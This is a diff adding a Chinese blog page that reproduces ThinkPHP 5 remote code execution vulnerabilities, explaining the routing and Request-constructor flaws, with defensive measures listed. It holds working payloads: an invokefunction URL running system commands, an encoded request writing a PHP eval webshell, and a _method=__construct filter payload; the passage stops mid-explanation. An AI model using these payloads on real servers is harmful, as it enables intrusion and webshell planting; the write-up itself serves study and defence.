@@ -1,0 +1,1045 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="ThinkPHP框架般有thinkphp2、thinkphp3、thinkphp5、thinkphp6版本，前两个版本已经停止更新，一般也没有人再继续用，所以就不再做复现了，本篇文章主要介绍下thinkphp5、6的漏洞 一、Thinkphp5 5.0.22&#x2F;5.1.29 远程代码执行漏洞影响版本：5.0&lt;thinkphp&lt;&#x3D;5.0.22、5.1&lt;thinkp">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ThinkPHP典型漏洞复现">
+<meta property="og:url" content="http://example.com/2025/03/27/ThinkPHP%E5%85%B8%E5%9E%8B%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
+<meta property="og:site_name" content="ljhflag">
+<meta property="og:description" content="ThinkPHP框架般有thinkphp2、thinkphp3、thinkphp5、thinkphp6版本，前两个版本已经停止更新，一般也没有人再继续用，所以就不再做复现了，本篇文章主要介绍下thinkphp5、6的漏洞 一、Thinkphp5 5.0.22&#x2F;5.1.29 远程代码执行漏洞影响版本：5.0&lt;thinkphp&lt;&#x3D;5.0.22、5.1&lt;thinkp">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503201705913.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271714284.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271715164.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926810.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926812.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926795.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931801.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931581.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931098.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271931398.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926314.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503271926327.webp">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272104553.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272110296.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272110975.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272113090.png">
+<meta property="og:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503272109841.png">
+<meta property="article:published_time" content="2025-03-27T14:27:00.000Z">
+<meta property="article:modified_time" content="2025-03-27T13:18:56.756Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CVE复现">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503201705913.png">
+  
+  
+  
+  <title>ThinkPHP典型漏洞复现 - ljhflag</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":"skSyD5RSTq4kiWeAhMeeY9ib-gzGzoHsz","app_key":"rQPg4V1fSy3hOP8QAyeJnyh8","server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Ljhflag</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="ThinkPHP典型漏洞复现"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-03-27 22:27" pubdate>
+          2025年3月27日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          5k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          42 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">ThinkPHP典型漏洞复现</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="ThinkPHP框架"><a href="#ThinkPHP框架" class="headerlink" title="ThinkPHP框架"></a>ThinkPHP框架</h1><p>般有thinkphp2、thinkphp3、thinkphp5、thinkphp6版本，前两个版本已经停止更新，一般也没有人再继续用，所以就不再做复现了，本篇文章主要介绍下thinkphp5、6的漏洞</p>
+<h2 id="一、Thinkphp5-5-0-22-5-1-29-远程代码执行漏洞"><a href="#一、Thinkphp5-5-0-22-5-1-29-远程代码执行漏洞" class="headerlink" title="一、Thinkphp5 5.0.22&#x2F;5.1.29 远程代码执行漏洞"></a>一、Thinkphp5 5.0.22&#x2F;5.1.29 远程代码执行漏洞</h2><h3 id="影响版本：5-0"><a href="#影响版本：5-0" class="headerlink" title="影响版本：5.0&lt;thinkphp&lt;&#x3D;5.0.22、5.1&lt;thinkphp&lt;&#x3D;5.1.29"></a><strong>影响版本</strong>：5.0&lt;thinkphp&lt;&#x3D;5.0.22、5.1&lt;thinkphp&lt;&#x3D;5.1.29</h3><h3 id="漏洞成因："><a href="#漏洞成因：" class="headerlink" title="漏洞成因："></a>漏洞成因：</h3><p>由于<strong>没有正确处理控制器名</strong>，导致在网站没有开启强制路由的情况下（即默认情况下）可以执行任意方法，从而导致远程命令执行漏洞 </p>
+<ol>
+<li><strong><code>Route::parseUrl()</code> 没有正确处理 <code>\</code> 符号</strong>，导致 <code>think\app</code> 被错误解析为控制器名。（因为 <code>parseUrl()</code> 只按照 <code>/</code> 进行分割，而 <code>\</code>不会被处理）</li>
+<li><strong><code>invokefunction()</code> 方法本身支持执行任意 PHP 函数</strong>，成为了攻击者利用的入口。</li>
+<li>**ThinkPHP 允许通过 URL 直接访问 <code>invokefunction()</code>**，没有额外的权限验证。</li>
+</ol>
+<h3 id="详细解释："><a href="#详细解释：" class="headerlink" title="详细解释："></a>详细解释：</h3><p>这个漏洞的核心原因是 <strong><code>routeCheck</code> 方法</strong> 在处理 URL 路由时，没有正确区分 <code>/</code>（正斜杠）和 <code>\</code>（反斜杠）。攻击者可以利用这个问题，<strong>绕过正常的路由限制，直接调用系统函数</strong>，从而导致 <strong>远程命令执行（RCE）漏洞</strong>。</p>
+<h3 id="1-漏洞发生的关键代码"><a href="#1-漏洞发生的关键代码" class="headerlink" title="1. 漏洞发生的关键代码"></a>1. 漏洞发生的关键代码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">// 路由无效 解析模块/控制器/操作/参数... 支持控制器自动搜索</span><br><span class="hljs-keyword">if</span> (<span class="hljs-literal">false</span> === <span class="hljs-variable">$result</span>) &#123;<br>    <span class="hljs-variable">$result</span> = <span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">parseUrl</span>(<span class="hljs-variable">$path</span>, <span class="hljs-variable">$depr</span>, <span class="hljs-variable">$config</span>[<span class="hljs-string">&#x27;controller_auto_search&#x27;</span>]);<br>&#125;<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$result</span>;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><strong><code>$path</code></strong> 变量是 URL 请求路径（例如 <code>index/think\app/invokefunction</code>）。</li>
+<li><strong><code>Route::parseUrl()</code></strong> 解析 <code>$path</code>，默认 <strong>按 <code>/</code>（正斜杠）分割</strong>，但不会处理 <code>\</code>（反斜杠）。</li>
+<li>由于 <code>think\app/invokefunction</code> <strong>包含反斜杠</strong>，ThinkPHP <strong>错误地解析</strong> 了它，将 <code>think\app</code> 作为控制器，而 <code>invokefunction</code> 作为方法。</li>
+</ul>
+<h3 id="2-URL-解析过程"><a href="#2-URL-解析过程" class="headerlink" title="2. URL 解析过程"></a>2. URL 解析过程</h3><p>假设攻击者访问：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">http://127.0.0.1:8080/index.php?s=index/think\app/invokefunction<br></code></pre></td></tr></table></figure>
+
+<p>ThinkPHP 执行：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$result</span> = <span class="hljs-title class_">Route</span>::<span class="hljs-title function_ invoke__">parseUrl</span>(<span class="hljs-string">&#x27;index/think\app/invokefunction&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>因为 <code>parseUrl()</code> 只按照 <code>/</code> 进行分割，而 <code>\</code> 不会被处理，所以解析后的 <code>$result</code> 是：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$result</span> = [<br>    <span class="hljs-number">0</span> =&gt; <span class="hljs-string">&#x27;index&#x27;</span>,<br>    <span class="hljs-number">1</span> =&gt; <span class="hljs-string">&#x27;think\app&#x27;</span>,  <span class="hljs-comment">// 解析错误！本该是 think.app</span><br>    <span class="hljs-number">2</span> =&gt; <span class="hljs-string">&#x27;invokefunction&#x27;</span><br>];<br></code></pre></td></tr></table></figure>
+
+<p>本来 ThinkPHP 期望：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">模块名 <span class="hljs-regexp">/ 控制器名 /</span> 方法名<br>index <span class="hljs-regexp">/ think /</span> app<br></code></pre></td></tr></table></figure>
+
+<p>但因为 <code>\</code> <strong>未被正确处理</strong>，导致：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">模块名 <span class="hljs-regexp">/ 控制器名 /</span> 方法名<br>index <span class="hljs-regexp">/ think\app /</span> invokefunction<br></code></pre></td></tr></table></figure>
+
+<p><code>think\app</code> 被错误识别为控制器！</p>
+<p>最终 ThinkPHP 进入 <code>app\Run::exec()</code>，代码如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$reflect</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">\ReflectionMethod</span>(<span class="hljs-variable">$controller</span>, <span class="hljs-variable">$action</span>);<br><span class="hljs-keyword">return</span> <span class="hljs-variable">$reflect</span>-&gt;<span class="hljs-title function_ invoke__">invokeArgs</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$class</span>) ? <span class="hljs-variable">$class</span> : <span class="hljs-literal">null</span>, <span class="hljs-variable">$params</span>);<br></code></pre></td></tr></table></figure>
+
+<p>在这里：</p>
+<ul>
+<li><strong><code>$controller = think\app</code></strong></li>
+<li><strong><code>$action = invokefunction</code></strong></li>
+</ul>
+<p><strong>这个 <code>invokefunction()</code> 方法在 <code>App</code> 类中确实存在</strong>：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">invokefunction</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>, <span class="hljs-variable">$vars</span> = []</span>)</span><br><span class="hljs-function"></span>&#123;<br>    <span class="hljs-keyword">return</span> <span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-variable">$function</span>, <span class="hljs-variable">$vars</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>所以 <code>ReflectionMethod::invokeArgs()</code> **成功调用 <code>invokefunction()</code>**，并执行攻击者传入的 PHP 函数。</p>
+<h3 id="3-漏洞利用示例"><a href="#3-漏洞利用示例" class="headerlink" title="3.漏洞利用示例"></a>3.漏洞利用示例</h3><p>在 ThinkPHP 框架中，<strong>控制器（Controller）</strong> 是用于处理 HTTP 请求的类。通常，访问 URL 时，会按照如下规则解析：</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>example.com<span class="hljs-regexp">/index.php/m</span>odule<span class="hljs-regexp">/controller/</span>action<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><code>module</code>：模块（可以省略）</li>
+<li><code>controller</code>：控制器（类名）</li>
+<li><code>action</code>：方法（函数名）</li>
+</ul>
+<p>ThinkPHP 提供了 强制路由模式，如果启用，所有访问请求必须经过 <code>route.php</code> 里定义的规则，而不能直接访问控制器的方法。</p>
+<p>但默认情况下，ThinkPHP 没有启用强制路由，这导致攻击者可以通过 URL 直接调用 任何类的方法。</p>
+<p>验证漏洞POC（<strong>在 ThinkPHP 5.x</strong> 版本中，<code>s</code> <strong>是默认的 URL 入口参数</strong>，用于解析路由。）</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8080</span>/index.php?s=<span class="hljs-keyword">index</span>/think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="hljs-number">0</span>]=<span class="hljs-keyword">system</span>&amp;vars[<span class="hljs-number">1</span>][]=whoami<br></code></pre></td></tr></table></figure>
+
+<p>ThinkPHP 解析 URL 时，会将参数传递给 **<code>invokefunction()</code>**，等效于：（这个函数是ThinkPHP 5.0.20、5.0.23 版本 <code>App</code> 类的方法）</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$function</span> = <span class="hljs-string">&#x27;call_user_func_array&#x27;</span>;<br><span class="hljs-variable">$vars</span> = [<span class="hljs-string">&#x27;system&#x27;</span>, [<span class="hljs-string">&#x27;whoami&#x27;</span>]];<br><br><span class="hljs-title function_ invoke__">call_user_func_array</span>(<span class="hljs-string">&#x27;call_user_func_array&#x27;</span>, [<span class="hljs-string">&#x27;system&#x27;</span>, [<span class="hljs-string">&#x27;whoami&#x27;</span>]]);<br></code></pre></td></tr></table></figure>
+
+<p> <strong><code>call_user_func_array()</code></strong> 作用是调用指定函数，并传递参数数组：（这个函数是PHP 内置函数）</p>
+<figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">call_user_func_array(&#x27;system&#x27;, [&#x27;whoami&#x27;])<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure>
+
+<p>等效于：</p>
+<figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs clean"><span class="hljs-keyword">system</span>(<span class="hljs-string">&#x27;whoami&#x27;</span>);<br></code></pre></td></tr></table></figure>
+
+<p>或者写入一句话（同样url编码）构造的方法同上</p>
+<figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">http:<span class="hljs-regexp">//</span><span class="hljs-number">127.0</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span>:<span class="hljs-number">8080</span>/index.php?s=<span class="hljs-keyword">index</span>/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[<span class="hljs-number">0</span>]=<span class="hljs-keyword">system</span>&amp;vars[<span class="hljs-number">1</span>[]=echo%2<span class="hljs-number">0</span>%27%<span class="hljs-number">3</span>C%<span class="hljs-number">3</span>Fphp%2<span class="hljs-number">0</span>%40eval%28%24_POST%<span class="hljs-number">5</span>B%22x%22%<span class="hljs-number">5</span>D%29%<span class="hljs-number">3</span>F%<span class="hljs-number">3</span>E%27%2<span class="hljs-number">0</span>%3Eshell.php%20<br></code></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/ljhflag/mypic@img/img/202503201705913.png" srcset="/img/loading.gif" lazyload alt="img"></p>
+<h3 id="防御措施："><a href="#防御措施：" class="headerlink" title="防御措施："></a>防御措施：</h3><ol>
+<li>升级 ThinkPHP</li>
+<li>启用强制路由（只有访问正确的路由才会生效）</li>
+<li>禁用 PHP 危险函数     禁止 <code>invokefunction()</code> 方法</li>
+<li>使用 WAF 进行 URL 过滤</li>
+</ol>
+<h2 id="二、ThinkPHP5-5-0-23-之前远程代码执行漏洞"><a href="#二、ThinkPHP5-5-0-23-之前远程代码执行漏洞" class="headerlink" title="二、ThinkPHP5  5.0.23 之前远程代码执行漏洞"></a>二、ThinkPHP5  5.0.23 之前远程代码执行漏洞</h2><p>注意：以下的漏洞所对应的ThinkPHP版本是5.0.23之前的不包括5.0.23</p>
+<h3 id="影响版本：-5-0-ThinkPHP"><a href="#影响版本：-5-0-ThinkPHP" class="headerlink" title="影响版本： 5.0&lt; ThinkPHP&lt;5.0.23、 5.1&lt; ThinkPHP&lt;5.1.31"></a>影响版本： 5.0&lt; ThinkPHP&lt;5.0.23、 5.1&lt; ThinkPHP&lt;5.1.31</h3><p>ThinkPHP5 5.0.23远程代码执行漏洞的利用过程涉及三个核心机制：<strong>路由机制缺陷</strong>、<code>method</code><strong>属性覆盖</strong>和<strong>方法调用</strong>。以下是对这三个环节的详细技术解析：</p>
+<h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">_method=__construct&amp;filter[]=system&amp;<span class="hljs-keyword">method</span>=<span class="hljs-title function_">get</span>&amp;<span class="hljs-title function_">server</span>[<span class="hljs-title function_">REQUEST_METHOD</span>]=<span class="hljs-title function_">id</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="Ⅰ、路由机制缺陷：-index-php-s-captcha-的作用"><a href="#Ⅰ、路由机制缺陷：-index-php-s-captcha-的作用" class="headerlink" title="Ⅰ、路由机制缺陷：/index.php?s=captcha 的作用"></a>Ⅰ、路由机制缺陷：<code>/index.php?s=captcha</code> 的作用</h3><ol>
+<li><p><strong>路由解析流程</strong> ThinkPHP框架通过URL参数<code>s</code>确定路由规则。当访问<code>/index.php?s=captcha</code>时，<code>s</code>参数指定了路由到<code>captcha</code>模块（验证码模块）。</p>
+<ul>
+<li>框架会尝试调用<code>Captcha</code>控制器的<code>index</code>方法，这是内置的验证码生成逻辑。</li>
+<li>漏洞利用的关键在于：<code>captcha</code>对应的路由注册为<code>method</code>类型，导致框架进入<code>method</code>分支处理（而非正常的控制器方法调用），绕过了路由安全检查。</li>
+</ul>
+</li>
+<li><p><strong>绕过路由检测</strong> 通过<code>s=captcha</code>，攻击者触发框架的<code>routeCheck</code>方法，但实际分发到<code>method</code>调度类型。这使得攻击链可以绕过正常的控制器参数过滤，直接操作<code>Request</code>类的敏感方法，为后续漏洞利用提供入口 。</p>
+</li>
+</ol>
+<h3 id="Ⅱ、属性覆盖：-method-construct-的利用"><a href="#Ⅱ、属性覆盖：-method-construct-的利用" class="headerlink" title="Ⅱ、属性覆盖：_method=__construct 的利用"></a>Ⅱ、属性覆盖：<code>_method=__construct</code> 的利用</h3><ol>
+<li><p><strong>构造函数覆盖原理</strong> <code>_method=__construct</code>通过表单伪装变量（<code>var_method</code>）触发<code>Request</code>类的构造函数<code>__construct()</code>。该函数允许通过传入的参数覆盖类的属性值：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php">PHPpublic <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$options</span> = []</span>) </span>&#123;<br>    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$options</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$name</span> =&gt; <span class="hljs-variable">$item</span>) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">property_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$name</span>)) &#123;<br>            <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-variable">$name</span> = <span class="hljs-variable">$item</span>; <span class="hljs-comment">// 覆盖类属性</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<ul>
+<li><p>攻击者通过POST参数覆盖<code>filter</code></p>
+<p>属性为<code>system</code></p>
+<p>以及<code>server[REQUEST_METHOD]</code></p>
+<p>为<code>id</code>，从而控制后续执行逻辑。</p>
+</li>
+</ul>
+</li>
+<li><p><strong>关键参数的作用</strong></p>
+<ul>
+<li><p><code>filter[]=system</code>：将<code>Request</code>类的<code>filter</code>属性设置为<code>system</code>函数，后续数据过滤时会调用此函数执行命令</p>
+<p><code>server[REQUEST_METHOD]=id</code>：覆盖服务器变量REQUEST_METHOD的值，作为system</p>
+<p>函数的参数（即执行system(‘id’)</p>
+</li>
+</ul>
+</li>
+</ol>
+<h3 id="Ⅲ、方法调用：method-get-的执行链"><a href="#Ⅲ、方法调用：method-get-的执行链" class="headerlink" title="Ⅲ、方法调用：method=get 的执行链"></a>Ⅲ、方法调用：<code>method=get</code> 的执行链</h3><ol>
+<li><p><strong>方法调用流程</strong> 通过<code>method=get</code>指定请求方法为GET，触发<code>Request::method()</code>方法的分支处理：method&#x3D;get</p>
+<p>使框架进入param()方法，调用input()函数处理请求参数在input()函数中，调用filterValue()方法，使用call_user_func执行filter属性指定的函数（即system）</p>
+</li>
+<li><p><strong>异常触发回显</strong> 当<code>data</code>参数为空时，<code>array_walk_recursive</code>函数处理会抛出异常。框架在异常处理阶段通过<code>ob_get_clean()</code>捕获输出缓冲区，将<code>system(&#39;id&#39;)</code>的执行结果回显到页面，从而实现命令执行结果的可见 。</p>
+</li>
+</ol>
+<h3 id="Ⅳ、漏洞利过程总结"><a href="#Ⅳ、漏洞利过程总结" class="headerlink" title="Ⅳ、漏洞利过程总结"></a>Ⅳ、漏洞利过程总结</h3><ol>
+<li><p><strong>ThinkPHP 解析 <code>_method=__construct</code></strong></p>
+<p>触发 <code>__construct</code> 方法。</p>
+<p><strong><code>filter[]=system</code> 被传递到 <code>array_map()</code></strong><code>$input = array_map($filter, $data);</code></p>
+<p>让 <code>system()</code> 处理输入。</p>
+<p><strong><code>server[REQUEST_METHOD]</code> 伪造 shell 命令</strong></p>
